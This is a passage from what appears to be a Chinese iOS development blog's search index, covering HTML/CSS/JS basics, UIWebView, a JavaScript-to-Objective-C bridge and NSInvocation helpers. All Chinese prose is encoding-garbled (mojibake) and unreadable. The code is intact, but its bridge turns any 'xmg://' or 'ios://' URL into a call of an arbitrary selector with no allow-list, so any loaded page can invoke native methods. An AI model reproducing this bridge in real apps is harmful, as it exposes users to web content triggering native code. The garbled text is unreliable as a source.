èƒ½éšæ„ä¿®æ”¹å°ºå¯¸ inlineï¼šè¡Œå†… å¤šä¸ªè¡Œå†…å…ƒç´ èƒ½æ˜¾ç¤ºåœ¨åŒä¸€è¡Œ ä¸èƒ½ä¿®æ”¹å°ºå¯¸ï¼Œå°ºå¯¸å–å†³äºŽå†…å®¹çš„å¤šå°‘ inline-blockï¼šè¡Œå†…-å—çº§ å¤šä¸ªè¡Œå†…-å—çº§å…ƒç´ èƒ½æ˜¾ç¤ºåœ¨åŒä¸€è¡Œ èƒ½éšæ„ä¿®æ”¹å°ºå¯¸ ä¸è®¾ç½®å°ºå¯¸ï¼Œé»˜è®¤çš„å°ºå¯¸å–å†³äºŽå†…å®¹çš„å¤šå°‘ äº†è§£å¸¸è§çš„å±žæ€§ font-size : å­—ä½“å¤§å° color: æ–‡å­—é¢œè‰² background: èƒŒæ™¯ display: æ˜¾ç¤ºçš„ç±»åž‹ï¼ˆblockã€inlineã€inline-blockã€noneï¼‰ padding margin border width height è„±ç¦»æ ‡å‡†æµ float: left\right ç»å¯¹å®šä½ position : absolute; right: 0px; bottom: 0px; å³ä¸‹è§’ å¦‚æžœæƒ³ç›¸å¯¹äºŽçˆ¶èŠ‚ç‚¹è¿›è¡Œå®šä½ï¼Œæœ€å¥½è®¾ç½®çˆ¶èŠ‚ç‚¹çš„positionä¸ºrelative åŽŸåˆ™ï¼šå­ç»çˆ¶ç›¸ å¸¸è§çš„é€‰æ‹©å™¨ æ ‡ç­¾é€‰æ‹©å™¨ï¼štagName ç±»é€‰æ‹©å™¨ï¼š.className idé€‰æ‹©å™¨ï¼š#id åŽä»£é€‰æ‹©å™¨(å¤šä¸ªé€‰æ‹©å™¨ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€)ï¼štagName .className .className tagName ç¾¤ç»„é€‰æ‹©å™¨(å¤šä¸ªé€‰æ‹©å™¨ä¹‹é—´ç”¨é€—å·,éš”å¼€)ï¼štagName, .className, tagName, .className ç›´æŽ¥åŽä»£é€‰æ‹©å™¨(å¤šä¸ªé€‰æ‹©å™¨ä¹‹é—´ç”¨å¤§äºŽå·&gt;éš”å¼€)ï¼štagName &gt; .className &gt; .className &gt; tagName å±žæ€§é€‰æ‹©å™¨ï¼štagName[arrtName=&quot;attrValue&quot;] é€‰æ‹©å™¨ç»„åˆï¼ˆå¤šä¸ªé€‰æ‹©å™¨ç²˜åœ¨ä¸€èµ·ï¼‰ï¼štagName.className ä¼ªç±» tagName:hover .className:hover tagName.className tagName:hover è¿›é˜¶ æ–‡æ¡£/è°·æ­Œ/ç™¾åº¦ JS èŠ‚ç‚¹çš„åŸºæœ¬æ“ä½œï¼ˆCRUDï¼‰ 12345678910111213141516* Cï¼ˆCreateï¼‰ï¼švar div = document.createElement('div');document.body.appendChild(div);* Rï¼ˆReadï¼‰ï¼švar div = document.getElementById('logo');var div = document.getElementsByTagName('div')[0];var div = document.getElementsByClassName('logo')[0];* Uï¼ˆUpdateï¼‰ï¼švar img = document.getElementById('logo');img.src = 'images/01.png';* Dï¼ˆDeleteï¼‰ï¼švar img = document.getElementById('logo');img.parentNode.removeChild(img); äº‹ä»¶ç»‘å®š 123456789101112131415161&gt; æŽ¨èåšæ³•var button = document.getElementById('login');button.onclick = function() &#123; // å®žçŽ°ç‚¹å‡»æŒ‰é’®æƒ³åšçš„äº‹æƒ…&#125;;2&gt; ç›´æŽ¥å†™åœ¨æ ‡ç­¾å†…éƒ¨&lt;button onclick="var age = 20; alert(age);"&gt;ç™»å½•&lt;/button&gt;3&gt; ä¸å¸¸ç”¨function login() &#123; // å®žçŽ°ç‚¹å‡»æŒ‰é’®æƒ³åšçš„äº‹æƒ…&#125;var button = document.getElementById('login');button.onclick = login; jQuery (æ¡†æž¶) é€šè¿‡é€‰æ‹©å™¨æŸ¥æ‰¾å…ƒç´  $(â€˜é€‰æ‹©å™¨â€™) jQueryæ”¯æŒç»å¤§éƒ¨åˆ†çš„CSSé€‰æ‹©å™¨ å±žæ€§æ“ä½œ èŽ·å¾—å±žæ€§ï¼š$(â€˜é€‰æ‹©å™¨â€™).attr(â€˜å±žæ€§åâ€™); è®¾ç½®å±žæ€§ï¼š$(â€˜é€‰æ‹©å™¨â€™).attr(â€˜å±žæ€§åâ€™, â€˜å±žæ€§å€¼â€™); æ˜¾ç¤ºå’Œéšè— æ˜¾ç¤ºï¼š$(â€˜é€‰æ‹©å™¨â€™).show(); éšè—ï¼š$(â€˜é€‰æ‹©å™¨â€™).hide(); æ˜¾ç¤ºå’Œéšè—æ¥å›žåˆ‡æ¢ï¼š$(â€˜é€‰æ‹©å™¨â€™).toggle(); äº‹ä»¶ç»‘å®š 1234567891011* ç‚¹å‡»äº‹ä»¶(å¸¸ç”¨)$('é€‰æ‹©å™¨').click(function() &#123; // å®žçŽ°ç‚¹å‡»æŒ‰é’®æƒ³åšçš„äº‹æƒ…&#125;).hide();// å…ˆç»™èŠ‚ç‚¹ç»‘å®šäº‹ä»¶ï¼Œå†éšè—* ç‚¹å‡»äº‹ä»¶(ä¸å¸¸ç”¨)function login() &#123; // å®žçŽ°ç‚¹å‡»æŒ‰é’®æƒ³åšçš„äº‹æƒ…&#125;$('é€‰æ‹©å™¨').click(login); ç›’å­æ¨¡åž‹ ç½‘é¡µä¸Šçš„æ¯ä¸€ä¸ªæ ‡ç­¾éƒ½æ˜¯ä¸€ä¸ªç›’å­ æ¯ä¸ªç›’å­éƒ½æœ‰å››ä¸ªå±žæ€§ å†…å®¹ï¼ˆcontentï¼‰ ç›’å­é‡Œè£…çš„ä¸œè¥¿ ç½‘é¡µä¸­é€šå¸¸æ˜¯æŒ‡æ–‡å­—å’Œå›¾ç‰‡ - å¡«å……ï¼ˆpaddingï¼Œå†…è¾¹è·ï¼‰ - æ€•ç›’å­é‡Œè£…çš„ï¼ˆè´µé‡çš„ï¼‰ä¸œè¥¿æŸåï¼Œè€Œæ·»åŠ çš„æ³¡æ²«æˆ–è€…å…¶å®ƒæŠ—éœ‡çš„è¾…æ–™- è¾¹æ¡†ï¼ˆborderï¼‰ï¼šç›’å­æœ¬èº«- è¾¹ç•Œï¼ˆmarginï¼Œå¤–è¾¹è·ï¼‰ - ç›’å­æ‘†æ”¾çš„æ—¶å€™çš„ä¸èƒ½å…¨éƒ¨å †åœ¨ä¸€èµ·ï¼Œç›’å­ä¹‹é—´è¦ç•™ä¸€å®šç©ºéš™ä¿æŒé€šé£Žï¼ŒåŒæ—¶ä¹Ÿä¸ºäº†æ–¹ä¾¿å–å‡º å†…å®¹ï¼ˆcontentï¼‰ â€“ å±žæ€§ å¡«å……ï¼ˆpaddingï¼Œå†…è¾¹è·ï¼‰ â€“ å±žæ€§ è¾¹ç•Œï¼ˆmarginï¼Œå¤–è¾¹è·ï¼‰ â€“ å±žæ€§ HTML5æ¡†æž¶ï¼ˆå¤§éƒ¨åˆ†éƒ½æ˜¯ä¸ºç§»åŠ¨è®¾å¤‡è€Œå†™çš„ï¼‰ æ¦‚å¿µ æœ‰äº†HTML5æ¡†æž¶ï¼Œç¼–å†™ç®€æ˜“çš„å‡ è¡ŒJSä»£ç ï¼Œå°±èƒ½å®žçŽ°éžå¸¸æ¼‚äº®çš„æ‰‹æœºç•Œé¢ HTML5æ¡†æž¶å°è£…äº†å¤§é‡çš„DOMèŠ‚ç‚¹æ“ä½œï¼Œå°è£…äº†å¤§é‡çš„CSSæ ·å¼ å¯¹JSçš„è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¯¹CSSçš„è¦æ±‚å¹¶ä¸é«˜ å¸¸è§çš„HTML5æ¡†æž¶ PhoneGap jQuery Mobile sencha-touch bootstrap (æ¡†æž¶) å¾ˆå¤šå®žç”¨çš„ä¸œè¥¿ å‚è€ƒä»£ç  å‚è€ƒ w3school jquery jquery manual]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘å¸¸ç”¨æŽ§ä»¶ä¹‹UIWebView]]></title>
    <url>%2Farchives%2F85b4c34d.html</url>
    <content type="text"><![CDATA[å‘æ™šæ„ä¸é€‚ï¼Œé©±è½¦ç™»å¤åŽŸã€‚å¤•é˜³æ— é™å¥½ï¼Œåªæ˜¯è¿‘é»„æ˜ã€‚ æŽå•†éš ã€Šä¹æ¸¸åŽŸ / ç™»ä¹æ¸¸åŽŸã€‹ å…³äºŽUIWebView UIWebViewæ˜¯iOSå†…ç½®çš„æµè§ˆå™¨æŽ§ä»¶ ç³»ç»Ÿè‡ªå¸¦çš„Safariæµè§ˆå™¨å°±æ˜¯é€šè¿‡UIWebViewå®žçŽ°çš„ UIWebViewä¸ä½†èƒ½åŠ è½½è¿œç¨‹çš„ç½‘é¡µèµ„æºï¼Œè¿˜èƒ½åŠ è½½ç»å¤§éƒ¨åˆ†çš„å¸¸è§æ–‡ä»¶ html\htm pdfã€docã€pptã€txt mp4 â€¦ â€¦ UIWebViewå¸¸ç”¨çš„åŠ è½½èµ„æºçš„æ–¹æ³• 1- (void)loadRequest:(NSURLRequest *)request; å¸¸ç”¨å±žæ€§å’Œæ–¹æ³•123456789101112131415161718// é‡æ–°åŠ è½½ï¼ˆåˆ·æ–°ï¼‰- (void)reload;// åœæ­¢åŠ è½½- (void)stopLoading;// å›žé€€- (void)goBack;// å‰è¿›- (void)goForward;// éœ€è¦è¿›è¡Œæ£€æµ‹çš„æ•°æ®ç±»åž‹@property(nonatomic) UIDataDetectorTypes dataDetectorTypes// æ˜¯å¦èƒ½å›žé€€@property(nonatomic,readonly,getter=canGoBack) BOOL canGoBack;// æ˜¯å¦èƒ½å‰è¿›@property(nonatomic,readonly,getter=canGoForward) BOOL canGoForward;// æ˜¯å¦æ­£åœ¨åŠ è½½ä¸­@property(nonatomic,readonly,getter=isLoading) BOOL loading;// æ˜¯å¦ä¼¸ç¼©å†…å®¹è‡³é€‚åº”å±å¹•å½“å‰å°ºå¯¸@property(nonatomic) BOOL scalesPageToFit; UIWebViewdä»£ç† æˆä¸ºUIWebViewçš„ä»£ç†ï¼Œéµå®ˆUIWebViewDelegateåè®®ï¼Œå°±èƒ½ç›‘å¬UIWebViewçš„åŠ è½½è¿‡ç¨‹ 12345678// å¼€å§‹å‘é€è¯·æ±‚ï¼ˆåŠ è½½æ•°æ®ï¼‰æ—¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•- (void)webViewDidStartLoad:(UIWebView *)webView;// è¯·æ±‚å®Œæ¯•ï¼ˆåŠ è½½æ•°æ®å®Œæ¯•ï¼‰æ—¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•- (void)webViewDidFinishLoad:(UIWebView *)webView;// è¯·æ±‚é”™è¯¯æ—¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error; 12345678910111213141516171819202122232425/** * webViewåŠ è½½ä¸€ä¸ªè¯·æ±‚ä¹‹å‰ ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³• è¿”å›žyes å¯ä»¥åŠ è½½ è¿”å›žno ä¸å…è®¸åŠ è½½ * å¯ä»¥ç€è¿™é‡Œæ‹¦æˆªè¯·æ±‚ è½¬åŒ–ä¸ºæ–¹æ³•å è°ƒç”¨ocæ–¹æ³• */- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123;// NSLog(@"%@",request);// &#123; URL: ios://openMyCamera &#125;// &#123; URL: ios://openMyAlbum &#125; NSString *url = request.URL.absoluteString; NSRange range = [url rangeOfString:@"ios://"]; if (range.length) &#123; // æˆªå–éœ€è¦å¾—éƒ¨åˆ† NSString *method = [url substringFromIndex:range.location + range.length]; // åŒ…è£…æˆSEL SEL selector = NSSelectorFromString(method); // æ‰§è¡Œå¯¹åº”çš„æ–¹æ³• [self performSelector:selector withObject:nil]; &#125; return YES;&#125; JSå’ŒOCäº’è°ƒJavaScript JavaScriptæ˜¯ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œç®€ç§°JSã€‚ JSçš„å¸¸è§ä½œç”¨æœ‰ï¼š ç»™HTMLç½‘é¡µæ·»åŠ åŠ¨æ€åŠŸèƒ½ï¼Œæ¯”å¦‚å“åº”ç”¨æˆ·çš„å„ç§æ“ä½œã€‚ æ“çºµHTMLå…ƒç´ ï¼Œæ¯”å¦‚æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹ç½‘é¡µå…ƒç´ ã€‚ å¸¸è§çš„JavaScriptå‡½æ•°ï¼š alert(10); // å¼¹æ¡† document.getElementById(â€˜testâ€™); // æ ¹æ®IDèŽ·å¾—æŸä¸ªDOMå…ƒç´  OCè°ƒç”¨JSçš„æ–¹æ³•1234567// å¦‚ä½•åœ¨OCä¸­è°ƒç”¨JavaScriptä»£ç // æ¸…é™¤å¹¿å‘Šå°±æ˜¯è°ƒç”¨javascriptä»£ç  åˆ é™¤ header å’Œ footer // document.getElementsByTagName('header')[0].remove(); // document.getElementsByTagName('footer')[0].remove() [self.webView stringByEvaluatingJavaScriptFromString:@"document.getElementsByTagName('header')[0].remove();"]; [self.webView stringByEvaluatingJavaScriptFromString:@"document.getElementsByTagName('footer')[0].remove();"]; JSè°ƒç”¨OCçš„æ–¹æ³• ç½‘é¡µä¿¡æ¯ 123456789101112131415161718192021222324252627282930313233343536&lt;html&gt; &lt;!--æè¿°ç½‘é¡µä¿¡æ¯--&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;hello world&lt;/title&gt; &lt;script&gt; function show() &#123; alert(1); &#125; function showTitle() &#123; alert(document.title); &#125; function repost() &#123; location.href = &quot;http://www.520it.com&quot;; &#125; function sum() &#123; return 1 + 1; &#125; function btnClick() &#123; location.href = &quot;xmg://sendMessageWithNumber_andContent_?10086&quot;; &#125; &lt;/script&gt; &lt;/head&gt; &lt;!--ç½‘é¡µå…·ä½“å†…å®¹--&gt; &lt;body&gt; ç”µè¯å·ç : 18888888888&lt;/br&gt; é‚®ç®±: 666666666@qq.com&lt;/br&gt; &lt;button style = &quot;background: red; height: 150px; width: 150px;&quot; onclick = &quot;btnClick();&quot;&gt;å“¥æ˜¯æŒ‰é’®&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; æ— å‚æ•°123456789101112131415161718192021222324252627282930#pragma mark - UIWebViewDelegate// æ¯æ¬¡å‘é€è¯·æ±‚å‰éƒ½ä¼šè°ƒç”¨// åˆ©ç”¨è¯¥æ–¹æ³•ä½œä¸ºJSå’ŒOCä¹‹é—´çš„æ¡¥æ¢// åœ¨JSè·³è½¬ç½‘é¡µ// åœ¨OCä»£ç†æ–¹æ³•ä¸­é€šè¿‡åˆ¤æ–­è‡ªå®šä¹‰åè®®å¤´, å†³å®šæ˜¯å¦æ˜¯JSè°ƒç”¨OCæ–¹æ³•// åœ¨OCä»£ç†æ–¹æ³•ä¸­é€šè¿‡æˆªå–å­—ç¬¦ä¸², èŽ·å–JSæƒ³è°ƒç”¨çš„OCæ–¹æ³•åç§°- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123; NSString *schem = @"xmg://"; NSString *urlStr = request.URL.absoluteString; if ([urlStr hasPrefix:schem]) &#123; NSLog(@"éœ€è¦è°ƒç”¨OCæ–¹æ³•"); // 1.ä»ŽURLä¸­èŽ·å–æ–¹æ³•åç§° // xmg://call NSString *methodName = [urlStr substringFromIndex:schem.length]; NSLog(@"%@", methodName); // 2.è°ƒç”¨æ–¹æ³• SEL sel = NSSelectorFromString(methodName); // å¿½ç•¥è­¦å‘Šä¿¡æ¯çš„ä½œç”¨èŒƒå›´å¼€å§‹#pragma clang diagnostic push // ä¸‹é¢è¿™ä¸€è¡Œä»£ç æ˜¯ç”¨äºŽæŒ‡å®šéœ€è¦å¿½ç•¥çš„è­¦å‘Šä¿¡æ¯#pragma clang diagnostic ignored "-Warc-performSelector-leaks" [self performSelector:sel withObject:nil]; // å¿½ç•¥è­¦å‘Šä¿¡æ¯çš„ä½œç”¨èŒƒå›´ç»“æŸ#pragma clang diagnostic pop return NO; &#125; return YES;&#125; æœ‰å‚æ•°(åŸºæœ¬æ–¹æ³•)123456789101112131415161718192021222324252627282930313233343536373839#pragma mark - UIWebViewDelegate// æ¯æ¬¡å‘é€è¯·æ±‚å‰éƒ½ä¼šè°ƒç”¨// åˆ©ç”¨è¯¥æ–¹æ³•ä½œä¸ºJSå’ŒOCä¹‹é—´çš„æ¡¥æ¢// åœ¨JSè·³è½¬ç½‘é¡µ// åœ¨OCä»£ç†æ–¹æ³•ä¸­é€šè¿‡åˆ¤æ–­è‡ªå®šä¹‰åè®®å¤´, å†³å®šæ˜¯å¦æ˜¯JSè°ƒç”¨OCæ–¹æ³•// åœ¨OCä»£ç†æ–¹æ³•ä¸­é€šè¿‡æˆªå–å­—ç¬¦ä¸², èŽ·å–JSæƒ³è°ƒç”¨çš„OCæ–¹æ³•åç§°- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123;NSString *schem = @"xmg://"; NSString *urlStr = request.URL.absoluteString; if ([urlStr hasPrefix:schem]) &#123; NSLog(@"éœ€è¦è°ƒç”¨OCæ–¹æ³•"); // 1.ä»ŽURLä¸­èŽ·å–æ–¹æ³•åç§° // xmg://sendMessageWithNumber_andContent_?10086&amp;love NSString *subPath = [urlStr substringFromIndex:schem.length]; // æ³¨æ„: å¦‚æžœæŒ‡å®šçš„ç”¨äºŽåˆ‡å‰²çš„å­—ç¬¦ä¸²ä¸å­˜åœ¨, é‚£ä¹ˆå°±ä¼šè¿”å›žæ•´ä¸ªå­—ç¬¦ä¸² NSArray *subPaths = [subPath componentsSeparatedByString:@"?"]; // 2.èŽ·å–æ–¹æ³•åç§° NSString *methodName = [subPaths firstObject]; methodName = [methodName stringByReplacingOccurrencesOfString:@"_" withString:@":"]; NSLog(@"%@", methodName); // 2.è°ƒç”¨æ–¹æ³• SEL sel = NSSelectorFromString(methodName); // 3.å¤„ç†å‚æ•° NSString *parma = nil; if (subPaths.count == 2) &#123; parma = [subPaths lastObject]; // 3.æˆªå–å‚æ•° NSArray *parmas = [parma componentsSeparatedByString:@"&amp;"]; [self performSelector:sel withObject:[parmas firstObject] withObject:[parmas lastObject]]; return NO; &#125; [self performSelector:sel withObject:parma]; return NO; &#125; return YES;&#125; æœ‰å‚æ•°(NSInvocationå°è£…æ–¹æ³•)(æŽ¨è)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#pragma mark - UIWebViewDelegate// æ¯æ¬¡å‘é€è¯·æ±‚å‰éƒ½ä¼šè°ƒç”¨// åˆ©ç”¨è¯¥æ–¹æ³•ä½œä¸ºJSå’ŒOCä¹‹é—´çš„æ¡¥æ¢// åœ¨JSè·³è½¬ç½‘é¡µ// åœ¨OCä»£ç†æ–¹æ³•ä¸­é€šè¿‡åˆ¤æ–­è‡ªå®šä¹‰åè®®å¤´, å†³å®šæ˜¯å¦æ˜¯JSè°ƒç”¨OCæ–¹æ³•// åœ¨OCä»£ç†æ–¹æ³•ä¸­é€šè¿‡æˆªå–å­—ç¬¦ä¸², èŽ·å–JSæƒ³è°ƒç”¨çš„OCæ–¹æ³•åç§°- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123; // xmg:// NSString *schem = @"xmg://"; NSString *urlStr = request.URL.absoluteString; if ([urlStr hasPrefix:schem]) &#123; NSLog(@"éœ€è¦è°ƒç”¨OCæ–¹æ³•"); // 1.ä»ŽURLä¸­èŽ·å–æ–¹æ³•åç§° // sendMessageWithNumber_andContent_?10086&amp;love NSString *subPath = [urlStr substringFromIndex:schem.length]; // æ³¨æ„: å¦‚æžœæŒ‡å®šçš„ç”¨äºŽåˆ‡å‰²çš„å­—ç¬¦ä¸²ä¸å­˜åœ¨, é‚£ä¹ˆå°±ä¼šè¿”å›žæ•´ä¸ªå­—ç¬¦ä¸² // sendMessageWithNumber_andContent_ // 10086&amp;love NSArray *subPaths = [subPath componentsSeparatedByString:@"?"]; // 2.èŽ·å–æ–¹æ³•åç§° NSString *methodName = [subPaths firstObject]; methodName = [methodName stringByReplacingOccurrencesOfString:@"_" withString:@":"]; NSLog(@"%@", methodName); // 2.è°ƒç”¨æ–¹æ³• SEL sel = NSSelectorFromString(methodName); // 3.å¤„ç†å‚æ•° NSArray *parmas = nil; if (subPaths.count == 2) &#123; parmas = [[subPaths lastObject] componentsSeparatedByString:@"&amp;"]; &#125; [self performSelector:sel withObjects:parmas]; return NO; &#125; return YES;&#125;// æµ‹è¯•çš„æ–¹æ³•å¦‚ä¸‹:- (void)call&#123; NSLog(@"%s", __func__);&#125;- (void)callWithNumber:(NSString *)number&#123; NSLog(@"æ‰“ç”µè¯ç»™%@", number);&#125;- (void)sendMessageWithNumber:(NSString *)number andContent:(NSString *)content&#123; NSLog(@"å‘ä¿¡æ¯ç»™%@, å†…å®¹æ˜¯%@", number, content);&#125;- (void)sendMessageWithNumber:(NSString *)number andContent:(NSString *)content status:(NSString *)status&#123; NSLog(@"å‘ä¿¡æ¯ç»™%@, å†…å®¹æ˜¯%@, å‘é€çš„çŠ¶æ€æ˜¯%@", number, content, status);&#125; NSInvocationåŸºæœ¬ä½¿ç”¨123456789101112131415161718192021222324252627282930// Signatureç­¾å: åœ¨åˆ›å»ºNSInvocationçš„æ—¶å€™, å¿…é¡»ä¼ é€’ä¸€ä¸ªç­¾åå¯¹è±¡// ç­¾åå¯¹è±¡çš„ä½œç”¨ : ç”¨äºŽèŽ·å–å‚æ•°çš„ä¸ªæ•°å’Œæ–¹æ³•çš„è¿”å›žå€¼// æ³¨æ„ç‚¹: åˆ›å»ºç­¾åå¯¹è±¡çš„æ—¶å€™ä¸æ˜¯ä½¿ç”¨NSMethodSignatureç±»åˆ›å»º \ è€Œæ˜¯æ–¹æ³•å±žäºŽè°å°±ç”¨è°æ¥åˆ›å»º NSMethodSignature *signature = [ViewController instanceMethodSignatureForSelector:@selector(sendMessageWithNumber:andContent:status:)];// NSInvocation; ç”¨æ¥åŒ…è£…æ–¹æ³•å’Œå¯¹åº”çš„å¯¹è±¡, å®ƒå¯ä»¥å­˜å‚¨æ–¹æ³•çš„åç§°,å¯¹åº”çš„å¯¹è±¡ ,å¯¹åº”çš„å‚æ•° // 1.åˆ›å»ºä¸€ä¸ªNSInvocationå¯¹è±¡ NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:signature]; invocation.target = self; // ä¿å­˜æ–¹æ³•æ‰€å±žçš„å¯¹è±¡ // ç»™invocationè®¾ç½®çš„æ–¹æ³•, å¿…é¡»å’Œç­¾åä¸­çš„æ–¹æ³•ä¸€è‡´ invocation.selector = @selector(sendMessageWithNumber:andContent:status:); // ä¿å­˜æ–¹æ³•åç§° // ç¬¬ä¸€ä¸ªå‚æ•°: éœ€è¦ç»™æŒ‡å®šæ–¹æ³•ä¼ é€’çš„å€¼ // + ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æŽ¥æ”¶ä¸€ä¸ªæŒ‡é’ˆ, ä¹Ÿå°±æ˜¯ä¼ é€’å€¼çš„æ—¶å€™éœ€è¦ä¼ é€’åœ°å€ // ç¬¬äºŒä¸ªå‚æ•°: éœ€è¦ç»™æŒ‡å®šæ–¹æ³•çš„ç¬¬å‡ ä¸ªå‚æ•°ä¼ å€¼ NSString *number = @"10086"; // æ³¨æ„: è®¾ç½®å‚æ•°çš„ç´¢å¼•æ—¶ä¸èƒ½ä»Ž0å¼€å§‹, å› ä¸º0å·²ç»è¢«selfå ç”¨, 1å·²ç»è¢«_cmdå ç”¨ [invocation setArgument:&amp;number atIndex:2]; NSString *content = @"love"; [invocation setArgument:&amp;content atIndex:3]; NSString *status = @"success"; [invocation setArgument:&amp;status atIndex:4]; // 2.è°ƒç”¨NSInvocationå¯¹è±¡çš„invokeæ–¹æ³• // åªè¦è°ƒç”¨invocationçš„invokeæ–¹æ³•, å°±ä»£è¡¨éœ€è¦æ‰§è¡Œ \ NSInvocationå¯¹è±¡ä¸­æŒ‡å®šå¯¹è±¡çš„æŒ‡å®šæ–¹æ³•, å¹¶ä¸”ä¼ é€’æŒ‡å®šçš„å‚æ•° [invocation invoke]; NSInvocationæ–¹æ³•å°è£….hæ–‡ä»¶123456#import &lt;Foundation/Foundation.h&gt;@interface NSObject (performSelector)- (id)performSelector:(SEL)aSelector withObjects:(NSArray *)objects;@end .mæ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#import "NSObject+performSelector.h"@implementation NSObject (performSelector)- (id)performSelector:(SEL)aSelector withObjects:(NSArray *)objects&#123; // 1.åˆ›å»ºç­¾åå¯¹è±¡ NSMethodSignature *signature = [[self class] instanceMethodSignatureForSelector:aSelector]; // åˆ¤æ–­ä¼ å…¥çš„æ–¹æ³•æ˜¯å¦å­˜å‚¨, å¦‚æžœæ–¹æ³•ä¸å­˜åœ¨ç­¾åå¯¹è±¡ä¸ºnil if (signature == nil) &#123; // ä¼ å…¥çš„æ–¹æ³•ä¸å­˜åœ¨ NSString *info = [NSString stringWithFormat:@" -[%@ %@]: unrecognized selector sent to instance", [self class], NSStringFromSelector(aSelector)]; @throw [[NSException alloc] initWithName:@"ä¸€ä¸ªç‰›Bçš„é”™è¯¯" reason:info userInfo:nil]; &#125; // 2.åˆ›å»ºä¸€ä¸ªNSInvocationå¯¹è±¡ NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:signature]; // 3.ä¿å­˜æ–¹æ³•æ‰€å±žçš„å¯¹è±¡ invocation.target = self; // ç»™invocationè®¾ç½®çš„æ–¹æ³•, å¿…é¡»å’Œç­¾åä¸­çš„æ–¹æ³•ä¸€è‡´ // 4.ä¿å­˜æ–¹æ³•åç§° invocation.selector = aSelector; // 5.è®¾ç½®å‚æ•° /* å½“å‰å¦‚æžœç›´æŽ¥éåŽ†å‚æ•°æ•°ç»„æ¥è®¾ç½®å‚æ•°, ä¼šå­˜åœ¨é—®é¢˜ å¦‚æžœå‚æ•°æ•°ç»„å…ƒç´ å¤šä½™å‚æ•°ä¸ªæ•°, é‚£ä¹ˆå°±ä¼šæŠ¥é”™ */ NSUInteger arguments = signature.numberOfArguments - 2; /* å¦‚æžœç›´æŽ¥éåŽ†å‚æ•°å€¼çš„ä¸ªæ•°, ä¼šå­˜åœ¨é—®é¢˜ å¦‚æžœå‚æ•°çš„ä¸ªæ•°å¤§äºŽäº†å‚æ•°å€¼çš„ä¸ªæ•°, é‚£ä¹ˆæ•°ç»„ä¼šè¶Šç•Œ */ NSUInteger objectsCount = objects.count; /* å‚æ•°å’Œå‚æ•°å€¼, è°å°‘å°±éåŽ†è° */ NSUInteger count = MIN(arguments, objectsCount); for (int i = 0; i &lt; count; i++) &#123; NSObject *obj = objects[i]; // å¤„ç†æ•°ç»„å‚æ•°ä¸­NSNullé—®é¢˜ if ([obj isKindOfClass:[NSNull class]]) &#123; obj = nil; &#125; [invocation setArgument:&amp;obj atIndex:i + 2]; &#125; // 6.è°ƒç”¨NSInvocationå¯¹è±¡çš„invokeæ–¹æ³• [invocation invoke]; id res = nil; // åˆ¤æ–­å½“å‰æ–¹æ³•æ˜¯å¦æœ‰è¿”å›žå€¼// NSLog(@"ReturnType = %zd", signature.methodReturnLength); if ( signature.methodReturnLength != 0) &#123; // 7.èŽ·å–è¿”å›žå€¼ // getReturnValueæ–¹æ³•ä¼šå°†ä¼šåŽ»åˆ°çš„æ–¹æ³•è¿”å›žå€¼èµ‹å€¼ç»™ä¼ å…¥çš„å¯¹è±¡ [invocation getReturnValue:&amp;res]; &#125; return res;&#125;@end]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UIWebView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹æ ¸å¿ƒåŠ¨ç”»ï¼ˆäºŒï¼‰ï¼šå¸¸ç”¨åŠ¨ç”»ç±»åŠæ–¹æ³•ä»‹ç»]]></title>
    <url>%2Farchives%2F69e9b43d.html</url>
    <content type="text"><![CDATA[ä¸è¾žé¶—é´‚å¦’å¹´èŠ³ï¼Œä½†æƒœæµå°˜æš—çƒ›æˆ¿ã€‚æ˜¨å¤œè¥¿æ± å‡‰éœ²æ»¡ï¼Œæ¡‚èŠ±å¹æ–­æœˆä¸­é¦™ã€‚ æŽå•†éš ã€Šæ˜¨å¤œã€‹ CABasicAnimation CABasicAnimationæ˜¯æ ¸å¿ƒåŠ¨ç”»ç±»ç°‡ä¸­çš„ä¸€ä¸ªç±»ï¼Œæ˜¯CAPropertyAnimationçš„å­ç±»ï¼Œå®ƒçš„ç¥–çˆ¶æ˜¯CAAnimationã€‚å®ƒä¸»è¦ç”¨äºŽåˆ¶ä½œæ¯”è¾ƒå•ä¸€çš„åŠ¨ç”»ï¼Œä¾‹å¦‚ï¼Œå¹³ç§»ã€ç¼©æ”¾ã€æ—‹è½¬ã€é¢œè‰²æ¸å˜ã€è¾¹æ¡†çš„å€¼çš„å˜åŒ–ç­‰ï¼Œä¹Ÿå°±æ˜¯å°†layerçš„æŸä¸ªå±žæ€§å€¼ä»Žä¸€ä¸ªå€¼åˆ°å¦ä¸€ä¸ªå€¼çš„å˜åŒ–ã€‚ å±žæ€§è¯´æ˜Ž: fromValueï¼š keyPathç›¸åº”å±žæ€§çš„åˆå§‹å€¼ toValueï¼š 